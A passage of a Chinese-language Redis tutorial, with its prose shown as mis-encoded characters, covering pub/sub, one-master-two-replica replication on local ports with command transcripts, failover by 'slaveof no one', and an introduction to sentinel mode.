<p>é€šè¿‡ PUBLISH å‘½ä»¤å‘è®¢é˜…è€…å‘é€æ¶ˆæ¯ï¼Œredis-server ä¼šä½¿ç”¨ç»™å®šçš„é¢‘é“ä½œä¸ºé”®ï¼Œåœ¨å®ƒæ‰€ç»´æŠ¤çš„ channelå­—å…¸ä¸­æŸ¥æ‰¾è®°å½•äº†è®¢é˜…è¿™ä¸ªé¢‘é“çš„æ‰€æœ‰å®¢æˆ·ç«¯çš„é“¾è¡¨ï¼Œéå†è¿™ä¸ªé“¾è¡¨ï¼Œå°†æ¶ˆæ¯å‘å¸ƒç»™æ‰€æœ‰è®¢é˜…è€…ã€‚</p>
<p>Pub&#x2F;Sub ä»å­—é¢ä¸Šç†è§£å°±æ˜¯å‘å¸ƒï¼ˆPublishï¼‰ä¸è®¢é˜…ï¼ˆSubscribeï¼‰ï¼Œåœ¨Redisä¸­ï¼Œä½ å¯ä»¥è®¾å®šå¯¹æŸä¸€ä¸ªkeyå€¼è¿›è¡Œæ¶ˆæ¯å‘å¸ƒåŠæ¶ˆæ¯è®¢é˜…ï¼Œå½“ä¸€ä¸ªkeyå€¼ä¸Šè¿›è¡Œäº†æ¶ˆæ¯å‘å¸ƒåï¼Œæ‰€æœ‰è®¢é˜…å®ƒçš„å®¢æˆ·ç«¯éƒ½ä¼šæ”¶åˆ°ç›¸åº”çš„æ¶ˆæ¯ã€‚è¿™ä¸€åŠŸèƒ½æœ€æ˜æ˜¾çš„ç”¨æ³•å°±æ˜¯ç”¨ä½œå®æ—¶æ¶ˆæ¯ç³»ç»Ÿï¼Œæ¯”å¦‚æ™®é€šçš„å³æ—¶èŠå¤©ï¼Œç¾¤èŠç­‰åŠŸèƒ½ã€‚</p>
<blockquote>
<p>ä½¿ç”¨åœºæ™¯</p>
</blockquote>
<ol>
<li>å®æ—¶æ¶ˆæ¯ç³»ç»Ÿ</li>
<li>å®æ—¶èŠå¤©ï¼ï¼ˆé¢‘é“å½“åšèŠå¤©å®¤ï¼Œå°†ä¿¡æ¯å›æ˜¾ç»™æ‰€æœ‰äººå³å¯ï¼ï¼‰</li>
<li>è®¢é˜…ï¼Œå…³æ³¨ç³»ç»Ÿéƒ½æ˜¯å¯ä»¥çš„ï¼</li>
</ol>
<p>ç¨å¾®å¤æ‚çš„åœºæ™¯æˆ‘ä»¬å°±ä¼šä½¿ç”¨ æ¶ˆæ¯ä¸­é—´ä»¶ MQ </p>
<h1 id="åä¸€ã€redisä¸»ä»å¤åˆ¶"><a href="#åä¸€ã€redisä¸»ä»å¤åˆ¶" class="headerlink" title="åä¸€ã€redisä¸»ä»å¤åˆ¶"></a>åä¸€ã€redisä¸»ä»å¤åˆ¶</h1><h2 id="1ã€æ¦‚å¿µ"><a href="#1ã€æ¦‚å¿µ" class="headerlink" title="1ã€æ¦‚å¿µ"></a>1ã€æ¦‚å¿µ</h2><p>ä¸»ä»å¤åˆ¶ï¼Œæ˜¯æŒ‡å°†ä¸€å°RedisæœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„RedisæœåŠ¡å™¨ã€‚å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master&#x2F;leader)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave&#x2F;follower)ï¼›<strong>æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ã€‚</strong>Masterä»¥å†™ä¸ºä¸»ï¼ŒSlave ä»¥è¯»ä¸ºä¸»ã€‚</p>
<p><strong>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯å°redisæœåŠ¡å™¨éƒ½æ˜¯ä¸»èŠ‚ç‚¹ï¼›</strong>ä¸”ä¸€ä¸ªä¸»èŠ‚ç‚¹å¯ä»¥æœ‰å¤šä¸ªä»èŠ‚ç‚¹ï¼ˆæˆ–è€…æ²¡æœ‰ä»èŠ‚ç‚¹ï¼‰ï¼Œä½†ä¸€ä¸ªä»èŠ‚ç‚¹åªèƒ½æœ‰ä¸€ä¸ªä¸»èŠ‚ç‚¹ã€‚</p>
<p><strong>ä¸»ä»å¤åˆ¶çš„ä½œç”¨ä¸»è¦åŒ…æ‹¬ï¼š</strong></p>
<ol>
<li>æ•°æ®å†—ä½™ï¼šä¸»ä»å¤åˆ¶å®ç°äº†æ•°æ®çš„çƒ­å¤‡ä»½ï¼Œæ˜¯æŒä¹…åŒ–ä¹‹å¤–çš„ä¸€ç§æ•°æ®å†—ä½™æ–¹å¼</li>
<li>æ•…éšœæ¢å¤ï¼šå½“ä¸»èŠ‚ç‚¹å‡ºç°é—®é¢˜æ—¶ï¼Œå¯ä»¥ç”±ä»èŠ‚ç‚¹æä¾›æœåŠ¡ï¼Œå®ç°å¿«é€Ÿçš„æ•…éšœæ¢å¤ï¼›å®é™…ä¸Šæ˜¯ä¸€ç§æœåŠ¡çš„å†—ä½™</li>
<li>è´Ÿè½½å‡è¡¡ï¼šåœ¨ä¸»ä»å¤åˆ¶çš„åŸºç¡€ä¸Šï¼Œé…åˆè¯»å†™åˆ†ç¦»ï¼Œå¯ä»¥ç”±ä¸»èŠ‚ç‚¹æä¾›å†™æœåŠ¡ï¼Œç”±ä»èŠ‚ç‚¹æä¾›è¯»æœåŠ¡ï¼ˆå³å†™Redisæ•°æ®æ—¶åº”ç”¨è¿æ¥ä¸»èŠ‚ç‚¹ï¼Œè¯»Redisæ•°æ®æ—¶åº”ç”¨è¿æ¥ä»èŠ‚ç‚¹ï¼‰ï¼Œåˆ†æ‹…æœåŠ¡å™¨è´Ÿè½½ï¼›å°¤å…¶æ˜¯åœ¨å†™å°‘è¯»å¤šçš„åœºæ™¯ä¸‹ï¼Œé€šè¿‡å¤šä¸ªä»èŠ‚ç‚¹åˆ†æ‹…è¯»è´Ÿè½½ï¼Œå¯ä»¥å¤§å¤§æé«˜RedisæœåŠ¡å™¨çš„å¹¶å‘é‡</li>
<li>é«˜å¯ç”¨ï¼ˆé›†ç¾¤ï¼‰åŸºçŸ³ï¼šé™¤äº†ä¸Šè¿°ä½œç”¨ä»¥å¤–ï¼Œä¸»ä»å¤åˆ¶è¿˜æ˜¯å“¨å…µå’Œé›†ç¾¤èƒ½å¤Ÿå®æ–½çš„åŸºç¡€ï¼Œå› æ­¤è¯´ä¸»ä»å¤åˆ¶æ˜¯Redisé«˜å¯ç”¨çš„åŸºç¡€</li>
</ol>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œè¦å°†redisè¿ç”¨äºå·¥ç¨‹é¡¹ç›®ä¸­ï¼Œåªä½¿ç”¨ä¸€å°redisæ˜¯ä¸‡ä¸‡ä¸èƒ½çš„ï¼ˆå®•æœºï¼‰ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p>
<ol>
<li>ä»ç»“æ„ä¸Šï¼Œå•ä¸ªRedisæœåŠ¡å™¨ä¼šå‘ç”Ÿå•ç‚¹æ•…éšœï¼Œå¹¶ä¸”ä¸€å°æœåŠ¡å™¨éœ€è¦å¤„ç†æ‰€æœ‰çš„è¯·æ±‚è´Ÿè½½ï¼Œå‹åŠ›è¾ƒå¤§</li>
<li>ä»å®¹é‡ä¸Šï¼Œå•ä¸ªRedisæœåŠ¡å™¨å†…å­˜å®¹é‡æœ‰é™ï¼Œå°±ç®—ä¸€å°RedisæœåŠ¡å™¨å†…å­˜å®¹é‡ä¸º256Gï¼Œä¹Ÿä¸èƒ½å°†æ‰€æœ‰å†…å­˜ç”¨ä½œRediså­˜å‚¨å†…å­˜ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œ<strong>å•å°Redisæœ€å¤§ä½¿ç”¨å†…å­˜ä¸åº”è¯¥è¶…è¿‡20G</strong></li>
</ol>
<p>ç”µå•†ç½‘ç«™ä¸Šçš„å•†å“ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¸€æ¬¡ä¸Šä¼ ï¼Œæ— æ•°æ¬¡æµè§ˆçš„ï¼Œè¯´ä¸“ä¸šç‚¹ä¹Ÿå°±æ˜¯â€å¤šè¯»å°‘å†™â€ã€‚</p>
<p>å¯¹äºè¿™ç§åœºæ™¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å¦‚ä¸‹è¿™ç§æ¶æ„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/84251e5da3e19e489866f69944d5e388--57f7--image-20240921160224020.png" alt="image-20240921160224020"></p>
<p>ä¸»ä»å¤åˆ¶ï¼Œè¯»å†™åˆ†ç¦»ï¼ 80% çš„æƒ…å†µä¸‹éƒ½æ˜¯åœ¨è¿›è¡Œè¯»æ“ä½œï¼å‡ç¼“æœåŠ¡å™¨çš„å‹åŠ›ï¼æ¶æ„ä¸­ç»å¸¸ä½¿ç”¨ï¼ ä¸€ä¸»äºŒä»ï¼</p>
<p>åªè¦åœ¨å…¬å¸ä¸­ï¼Œä¸»ä»å¤åˆ¶å°±æ˜¯å¿…é¡»è¦ä½¿ç”¨çš„ï¼Œå› ä¸ºåœ¨çœŸå®çš„é¡¹ç›®ä¸­ä¸å¯èƒ½å•æœºä½¿ç”¨Redisï¼ </p>
<h2 id="2ã€ç¯å¢ƒæ¨¡æ‹Ÿé…ç½®"><a href="#2ã€ç¯å¢ƒæ¨¡æ‹Ÿé…ç½®" class="headerlink" title="2ã€ç¯å¢ƒæ¨¡æ‹Ÿé…ç½®"></a>2ã€ç¯å¢ƒæ¨¡æ‹Ÿé…ç½®</h2><p>å¤åˆ¶ä¸‰ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹å¯¹åº”çš„ä¿¡æ¯</p>
<ol>
<li><p>æ–‡ä»¶å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-6380.conf</span><br><span class="line">redis-6381.conf</span><br><span class="line">redis-6382.conf</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç«¯å£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">port 6380</span><br><span class="line">port 6381</span><br><span class="line">port 6382</span><br></pre></td></tr></table></figure>
</li>
<li><p>pidåå­—</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pidfile /var/run/redis_6380.pid</span><br><span class="line">pidfile /var/run/redis_6381.pid</span><br><span class="line">pidfile /var/run/redis_6382.pid</span><br></pre></td></tr></table></figure>
</li>
<li><p>logæ–‡ä»¶åå­—</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">logfile <span class="string">&quot;6380.log&quot;</span></span><br><span class="line">logfile <span class="string">&quot;6381.log&quot;</span></span><br><span class="line">logfile <span class="string">&quot;6382.log&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>dump.rdbåå­—</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dbfilename dump80.rdb </span><br><span class="line">dbfilename dump81.rdb </span><br><span class="line">dbfilename dump82.rdb</span><br></pre></td></tr></table></figure></li>
</ol>
<p>å¯åŠ¨ä¸Šé¢ä¸‰å°æœåŠ¡</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/88e39336389ca79fb6b3e81850eb95cb--dedf--image-20240921161940317.png" alt="image-20240921161940317"></p>
<p>æŸ¥çœ‹6380çš„åº“çš„ä¿¡æ¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6380</span>&gt; info replication</span><br><span class="line"># Replication</span><br><span class="line">role:master</span><br><span class="line">connected_slaves:<span class="number">0</span></span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:2f1e61ead6a91614ced7226237145ac0dbc7a617</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">0</span></span><br><span class="line">second_repl_offset:-<span class="number">1</span></span><br><span class="line">repl_backlog_active:<span class="number">0</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">0</span></span><br><span class="line">repl_backlog_histlen:<span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="3ã€ä¸€ä¸»äºŒä»"><a href="#3ã€ä¸€ä¸»äºŒä»" class="headerlink" title="3ã€ä¸€ä¸»äºŒä»"></a>3ã€ä¸€ä¸»äºŒä»</h2><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯å°RedisæœåŠ¡å™¨éƒ½æ˜¯ä¸»èŠ‚ç‚¹ï¼› æˆ‘ä»¬ä¸€èˆ¬æƒ…å†µä¸‹åªç”¨é…ç½®ä»æœºå°±å¥½äº†ï¼</p>
<p>è®¤è€å¤§ï¼ ä¸€ä¸» ï¼ˆ6380ï¼‰äºŒä»ï¼ˆ6381ï¼Œ6382ï¼‰</p>
<p>é…ç½®6380ä½œä¸º6381çš„ä¸»æœº</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6381</span>&gt; SLAVEOF <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">6380</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6381</span>&gt; info replication</span><br><span class="line"># Replication</span><br><span class="line">role:slave</span><br><span class="line">master_host:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">master_port:<span class="number">6380</span></span><br><span class="line">master_link_status:up</span><br><span class="line">master_last_io_seconds_ago:<span class="number">6</span></span><br><span class="line">master_sync_in_progress:<span class="number">0</span></span><br><span class="line">slave_read_repl_offset:<span class="number">14</span></span><br><span class="line">slave_repl_offset:<span class="number">14</span></span><br><span class="line">slave_priority:<span class="number">100</span></span><br><span class="line">slave_read_only:<span class="number">1</span></span><br><span class="line">replica_announced:<span class="number">1</span></span><br><span class="line">connected_slaves:<span class="number">0</span></span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:8196217be6f411e9a1b76aa7820448ad9a8b6068</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">14</span></span><br><span class="line">second_repl_offset:-<span class="number">1</span></span><br><span class="line">repl_backlog_active:<span class="number">1</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">15</span></span><br><span class="line">repl_backlog_histlen:<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>é‡æ–°æŸ¥çœ‹6380çš„é…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6380&gt; info replication</span><br><span class="line"><span class="comment"># Replication</span></span><br><span class="line">role:master</span><br><span class="line">connected_slaves:1</span><br><span class="line">slave0:ip=127.0.0.1,port=6381,state=online,offset=126,lag=0</span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:8196217be6f411e9a1b76aa7820448ad9a8b6068</span><br><span class="line">master_replid2:0000000000000000000000000000000000000000</span><br><span class="line">master_repl_offset:126</span><br><span class="line">second_repl_offset:-1</span><br><span class="line">repl_backlog_active:1</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:1</span><br><span class="line">repl_backlog_histlen:126</span><br></pre></td></tr></table></figure>

<p>åŒæ ·çš„é…ç½®é…ç½®6382å³å¯</p>
<p><strong>çœŸå®çš„ä»ä¸»é…ç½®åº”è¯¥åœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®ï¼Œè¿™æ ·çš„è¯æ˜¯æ°¸ä¹…çš„ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æ˜¯å‘½ä»¤ï¼Œæš‚æ—¶çš„ï¼</strong></p>
<blockquote>
<p>ç»†èŠ‚</p>
</blockquote>
<p>ä¸»æœºå¯ä»¥è¯»ï¼Œå¯ä»¥å†™ï¼Œä»æœºåªèƒ½è¯»ï¼Œä¸èƒ½å†™ï¼ä¸»æœºä¸­çš„æ‰€æœ‰ä¿¡æ¯å’Œæ•°æ®ï¼Œéƒ½ä¼šè¢«ä»æœºä¿å­˜</p>
<p>ä¸»æœºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6380</span>&gt; set k1 v1</span><br><span class="line">OK</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6380</span>&gt; get k1</span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br></pre></td></tr></table></figure>

<p>ä»æœºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6381</span>&gt; set k2 <span class="title function_">v2</span></span><br><span class="line"><span class="params">(error)</span> READONLY You can<span class="string">&#x27;t write against a read only replica.</span></span><br><span class="line"><span class="string">127.0.0.1:6381&gt; get k1</span></span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ï¼šä¸»æœºæ–­å¼€è¿æ¥ï¼Œä»æœºä¾æ—§è¿æ¥åˆ°ä¸»æœºçš„ï¼Œä½†æ˜¯æ²¡æœ‰å†™æ“ä½œï¼Œè¿™ä¸ªæ—¶å€™ï¼Œä¸»æœºå¦‚æœå›æ¥äº†ï¼Œä»æœºä¾æ—§å¯ä»¥ç›´æ¥è·å–åˆ°ä¸»æœºå†™çš„ä¿¡æ¯ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸»æœºå®•æœºäº†</span></span><br><span class="line">127.0.0.1:6380&gt; shutdown</span><br><span class="line">not connected&gt; <span class="built_in">exit</span></span><br><span class="line"><span class="comment"># ä»æœºä¾æ—§å¯è¯»</span></span><br><span class="line">127.0.0.1:6381&gt; get k1</span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br><span class="line"><span class="comment"># ä¸»æœºå›æ¥äº† å¹¶ä¸”åšäº†å†™æ“ä½œ</span></span><br><span class="line">root@VM-16-10-ubuntu:/usr/local/bin<span class="comment"># redis-server myconfig/redis-6380.conf</span></span><br><span class="line">root@VM-16-10-ubuntu:/usr/local/bin<span class="comment"># redis-cli -p 6380</span></span><br><span class="line">127.0.0.1:6380&gt; <span class="built_in">set</span> k2 v2</span><br><span class="line">OK</span><br><span class="line"><span class="comment"># ä»æœºè¿˜æ˜¯å¯è¯»</span></span><br><span class="line">127.0.0.1:6381&gt; get k2</span><br><span class="line"><span class="string">&quot;v2&quot;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯ä½¿ç”¨å‘½ä»¤è¡Œï¼Œæ¥é…ç½®çš„ä¸»ä»ï¼Œè¿™ä¸ªæ—¶å€™å¦‚æœé‡å¯äº†ï¼Œå°±ä¼šå˜å›ä¸»æœºï¼åªè¦å˜ä¸ºä»æœºï¼Œç«‹é©¬å°±ä¼šä»ä¸»æœºä¸­è·å–å€¼ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6380&gt; shutdown <span class="comment"># ä»æœºå®•æœºäº†</span></span><br><span class="line">not connected&gt; <span class="built_in">exit</span></span><br><span class="line">[root@iZwz9efdd2ukk4oauustczZ bin]<span class="comment"># redis-server myconfig/redis80.conf  # é‡æ–°å¯åŠ¨æœåŠ¡</span></span><br><span class="line">[root@iZwz9efdd2ukk4oauustczZ bin]<span class="comment"># redis-cli -p 6380</span></span><br><span class="line">127.0.0.1:6380&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k2&quot;</span></span><br><span class="line">2) <span class="string">&quot;k1&quot;</span></span><br><span class="line">127.0.0.1:6380&gt; info replication <span class="comment"># å‘ç°å˜å›ä¸»æœºäº†</span></span><br><span class="line"><span class="comment"># Replication</span></span><br><span class="line">role:master</span><br><span class="line">connected_slaves:0</span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:99c0d5a904392e0a4509b01cc77e1c9cc5e85495</span><br><span class="line">master_replid2:0000000000000000000000000000000000000000</span><br><span class="line">master_repl_offset:0</span><br><span class="line">second_repl_offset:-1</span><br><span class="line">repl_backlog_active:0</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:0</span><br><span class="line">repl_backlog_histlen:0</span><br><span class="line">127.0.0.1:6380&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸ªæ—¶å€™åŸå…ˆä¸»æœºåšå†™æ“ä½œ</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k3 v3</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œä¹Ÿæ˜¯æ‹¿ä¸åˆ°çš„ å› ä¸ºå¤§å®¶éƒ½æ˜¯ä¸»æœºï¼Œæ²¡æœ‰åŒæ­¥</span></span><br><span class="line">127.0.0.1:6380&gt; get k3</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6380&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 6380å†æ¬¡å˜æˆ6379çš„ä»æœºï¼Œå°±å¯ä»¥è·å–äº†</span></span><br><span class="line">127.0.0.1:6380&gt; slaveof 127.0.0.1 6379</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6380&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k3&quot;</span></span><br><span class="line">2) <span class="string">&quot;k1&quot;</span></span><br><span class="line">3) <span class="string">&quot;k2&quot;</span></span><br><span class="line">127.0.0.1:6380&gt; get k3</span><br><span class="line"><span class="string">&quot;v3&quot;</span></span><br><span class="line">127.0.0.1:6380&gt; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¤åˆ¶åŸç†</p>
</blockquote>
<p>Slave å¯åŠ¨æˆåŠŸè¿æ¥åˆ° master åä¼šå‘é€ä¸€ä¸ªsyncåŒæ­¥å‘½ä»¤</p>
<p>Master æ¥åˆ°å‘½ä»¤ï¼Œå¯åŠ¨åå°çš„å­˜ç›˜è¿›ç¨‹ï¼ŒåŒæ—¶æ”¶é›†æ‰€æœ‰æ¥æ”¶åˆ°çš„ç”¨äºä¿®æ”¹æ•°æ®é›†å‘½ä»¤ï¼Œåœ¨åå°è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œmasterå°†ä¼ é€æ•´ä¸ªæ•°æ®æ–‡ä»¶åˆ°slaveï¼Œå¹¶å®Œæˆä¸€æ¬¡å®Œå…¨åŒæ­¥ã€‚</p>
<p><strong>å…¨é‡å¤åˆ¶ï¼š</strong>slaveæœåŠ¡åœ¨æ¥æ”¶åˆ°æ•°æ®åº“æ–‡ä»¶æ•°æ®åï¼Œå°†å…¶å­˜ç›˜å¹¶åŠ è½½åˆ°å†…å­˜ä¸­</p>
<p><strong>å¢é‡å¤åˆ¶ï¼š</strong>Master ç»§ç»­å°†æ–°çš„æ‰€æœ‰æ”¶é›†åˆ°çš„ä¿®æ”¹å‘½ä»¤ä¾æ¬¡ä¼ ç»™slaveï¼Œå®ŒæˆåŒæ­¥</p>
<p>ä½†æ˜¯åªè¦æ˜¯é‡æ–°è¿æ¥masterï¼Œä¸€æ¬¡å®Œå…¨åŒæ­¥ï¼ˆå…¨é‡å¤åˆ¶ï¼‰å°†è¢«è‡ªåŠ¨æ‰§è¡Œï¼ æˆ‘ä»¬çš„æ•°æ®ä¸€å®šå¯ä»¥åœ¨ä»æœºä¸­çœ‹åˆ°ï¼</p>
<blockquote>
<p>å±‚å±‚é“¾è·¯</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/723bdbef4c75f6c57ea2e99d09f6095e--4ee3--image-20240921163224209.png" alt="image-20240921163224209"></p>
<p>æ­¤æ—¶6380è¿˜æ˜¯ä»èŠ‚ç‚¹</p>
<blockquote>
<p>å¦‚æœæ²¡æœ‰è€å¤§äº†ï¼Œè¿™ä¸ªæ—¶å€™èƒ½ä¸èƒ½é€‰æ‹©ä¸€ä¸ªè€å¤§å‡ºæ¥å‘¢ï¼Ÿ æ‰‹åŠ¨ï¼</p>
</blockquote>
<p>è°‹æœç¯¡ä½</p>
<p>å¦‚æœä¸»æœºæ–­å¼€äº†è¿æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>slaveof no one</code> è®©è‡ªå·±å˜æˆä¸»æœºï¼å…¶ä»–çš„èŠ‚ç‚¹å°±å¯ä»¥æ‰‹åŠ¨è¿æ¥åˆ°æœ€æ–°çš„è¿™ä¸ªä¸»èŠ‚ç‚¹ï¼ˆæ‰‹åŠ¨ï¼‰ï¼å¦‚æœè¿™ä¸ªæ—¶å€™è€å¤§ä¿®å¤äº†ï¼Œé‚£å°±é‡æ–°è¿æ¥ï¼</p>
<h2 id="4ã€å“¨å…µæ¨¡å¼"><a href="#4ã€å“¨å…µæ¨¡å¼" class="headerlink" title="4ã€å“¨å…µæ¨¡å¼"></a>4ã€å“¨å…µæ¨¡å¼</h2><p>ï¼ˆè‡ªåŠ¨é€‰ä¸¾è€å¤§çš„æ¨¡å¼ï¼‰</p>
<blockquote>
<p>æ¦‚è¿°</p>
</blockquote>
<p>ä¸»ä»åˆ‡æ¢æŠ€æœ¯çš„æ–¹æ³•æ˜¯ï¼šå½“ä¸»æœåŠ¡å™¨å®•æœºåï¼Œéœ€è¦æ‰‹åŠ¨æŠŠä¸€å°ä»æœåŠ¡å™¨åˆ‡æ¢ä¸ºä¸»æœåŠ¡å™¨ï¼Œè¿™å°±éœ€è¦äººå·¥å¹²é¢„ï¼Œè´¹äº‹è´¹åŠ›ï¼Œè¿˜ä¼šé€ æˆä¸€æ®µæ—¶é—´å†…æœåŠ¡ä¸å¯ç”¨ã€‚è¿™ä¸æ˜¯ä¸€ç§æ¨èçš„æ–¹å¼ï¼Œæ›´å¤šæ—¶å€™ï¼Œæˆ‘ä»¬ä¼˜å…ˆè€ƒè™‘å“¨å…µæ¨¡å¼ã€‚Redisä»2.8å¼€å§‹æ­£å¼æä¾›äº†Sentinelï¼ˆå“¨å…µï¼‰ æ¶æ„æ¥è§£å†³è¿™ä¸ªé—®é¢˜</p>
<p>è°‹æœç¯¡ä½çš„è‡ªåŠ¨ç‰ˆï¼Œèƒ½å¤Ÿåå°ç›‘æ§ä¸»æœºæ˜¯å¦æ•…éšœï¼Œå¦‚æœæ•…éšœäº†æ ¹æ®æŠ•ç¥¨æ•°<strong>è‡ªåŠ¨å°†ä»åº“è½¬æ¢ä¸ºä¸»åº“</strong>ã€‚</p>
<p>å“¨å…µæ¨¡å¼æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ¨¡å¼ï¼Œé¦–å…ˆRedisæä¾›äº†å“¨å…µçš„å‘½ä»¤ï¼Œå“¨å…µæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼Œä½œä¸ºè¿›ç¨‹ï¼Œå®ƒä¼šç‹¬ç«‹è¿è¡Œã€‚å…¶åŸç†æ˜¯<strong>å“¨å…µé€šè¿‡å‘é€å‘½ä»¤ï¼Œç­‰å¾…RedisæœåŠ¡å™¨å“åº”ï¼Œä»è€Œç›‘æ§è¿è¡Œçš„å¤šä¸ªRediså®ä¾‹</strong>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/2cf1c5d6a2a3efa128749c33e76a09b6--1c7e--image-20240921164130454.png" alt="image-20240921164130454"></p>
<p>è¿™é‡Œçš„å“¨å…µæœ‰ä¸¤ä¸ªä½œç”¨</p>
<ul>
<li>é€šè¿‡å‘é€å‘½ä»¤ï¼Œè®©RedisæœåŠ¡å™¨è¿”å›ç›‘æ§å…¶è¿è¡ŒçŠ¶æ€ï¼ŒåŒ…æ‹¬ä¸»æœåŠ¡å™¨å’Œä»æœåŠ¡å™¨ã€‚</li>
<li>å½“å“¨å…µç›‘æµ‹åˆ°masterå®•æœºï¼Œä¼šè‡ªåŠ¨å°†slaveåˆ‡æ¢æˆmasterï¼Œç„¶åé€šè¿‡<strong>å‘å¸ƒè®¢é˜…æ¨¡å¼</strong>é€šçŸ¥å…¶ä»–çš„ä»æœåŠ¡å™¨ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œè®©å®ƒä»¬åˆ‡æ¢ä¸»æœºã€‚</li>
</ul>
<p>ç„¶è€Œä¸€ä¸ªå“¨å…µè¿›ç¨‹å¯¹RedisæœåŠ¡å™¨è¿›è¡Œç›‘æ§ï¼Œå¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šä¸ªå“¨å…µè¿›è¡Œç›‘æ§ã€‚å„ä¸ªå“¨å…µä¹‹é—´è¿˜ä¼šè¿›è¡Œç›‘æ§ï¼Œè¿™æ ·å°±å½¢æˆäº†å¤šå“¨å…µæ¨¡å¼ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/c32fb55d8058e4eed951465390d3f5e2--ca5c--image-20240921164314334.png" alt="image-20240921164314334"></p>
